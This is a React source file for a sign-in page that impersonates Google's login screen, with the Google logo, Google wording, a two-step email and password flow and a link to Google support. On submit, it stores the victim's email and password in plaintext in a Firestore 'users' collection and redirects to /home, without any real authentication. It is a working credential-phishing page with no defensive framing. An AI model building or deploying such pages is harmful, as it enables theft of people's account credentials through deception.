import React, { useState } from "react";
import { Icon } from "@iconify/react";
import { Link, useNavigate } from "react-router-dom";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import { database } from "../firebase-config";

const SignIn = () => {
  const navigate = useNavigate();
  const [next, setNext] = useState(false);
  const clickNext = () => setNext((prev) => !prev);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const db = getFirestore();
      await addDoc(collection(db, "users"), {
        email,
        password,
      });
      navigate("/home");
    } catch (error) {
      console.error("Error adding user: ", error);
      alert("Failed to add user.");
    }
  };

  return (
    <div className="bg-gray text-light flex h-screen items-center justify-center md:px-52">
      <div className="h-full w-full md:h-max">
        <div className="bg-dark h-full p-6 md:mb-5 md:rounded-4xl md:p-9">
          {/* Google Logo */}
          <Icon icon="flat-color-icons:google" className="size-12" />

          <div className="flex flex-col gap-x-16 md:flex-row">
            {/* Top Text */}
            <div className="md:w-[50%]">
              {!next ? (
                <>
                  <h1 className="mt-6 text-3xl font-semibold">Sign In</h1>
                  <p className="mt-4 mb-9 flex-wrap font-medium">
                    with your Google Account. This account will be available to
                    other Google apps in the browser.
                  </p>
                </>
              ) : (
                <p className="mt-4 mb-9 flex-wrap font-medium">
                  To continue, please verify it's you
                </p>
              )}
            </div>

            {/* Form */}
            <form
              onSubmit={handleSubmit}
              className="space-y-10 md:mt-5 md:w-[50%]"
            >
              {/* Emaill Input */}
              {!next && (
                <>
                  <div className="space-y-2">
                    <div className="input-container w-full">
                      <input
                        type="text"
                        id="email"
                        placeholder=""
                        required
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                      />
                      <label htmlFor="email">Email or phone</label>
                    </div>
                    <span className="text-blue text-sm font-medium hover:underline">
                      Forgot email?
                    </span>
                  </div>
                  <p className="text-sm">
                    Not your computer? Use Private Browsing windows to sign in.
                    <Link
                      to="https://support.google.com/accounts/answer/2917834?visit_id=638751945359498872-2958348846&p=signin_privatebrowsing&hl=en&rd=1"
                      className="text-blue ml-1 hover:underline"
                    >
                      Learn more about using Guest mode
                    </Link>
                  </p>
                  <Button type="button" onClick={clickNext} />
                </>
              )}

              {/* Password Input */}
              {next && (
                <>
                  <div className="mb-10 space-y-2">
                    <div className="input-container w-full">
                      <input
                        type="password"
                        id="password"
                        placeholder=""
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      <label htmlFor="password">Enter your password</label>
                    </div>

                    {/* Show password checkbox */}
                    <label className="flex items-center gap-x-2 text-sm font-medium hover:underline">
                      <input
                        type="checkbox"
                        className="bg-dark border-border size-3 appearance-none border"
                      />
                      Show password
                    </label>
                  </div>
                  <Button type="submit" />
                </>
              )}
            </form>
          </div>
        </div>

        {/* Footer */}
        <div className="bg-dark flex justify-between px-6 pb-6 text-xs md:bg-transparent">
          <div className="flex gap-x-4">
            <span>English (Unites States)</span>

            <Icon icon="fa6-solid:sort-down" />
          </div>

          <div className="flex gap-x-5">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
          </div>
        </div>
      </div>
    </div>
  );
};

const Button = ({ type, onClick }) => {
  return (
    <div className="flex justify-end">
      <button
        onClick={onClick}
        type={type}
        className="bg-blue text-dark flex rounded-full px-6 py-2 text-sm font-semibold"
      >
        Next
      </button>
    </div>
  );
};

export default SignIn;
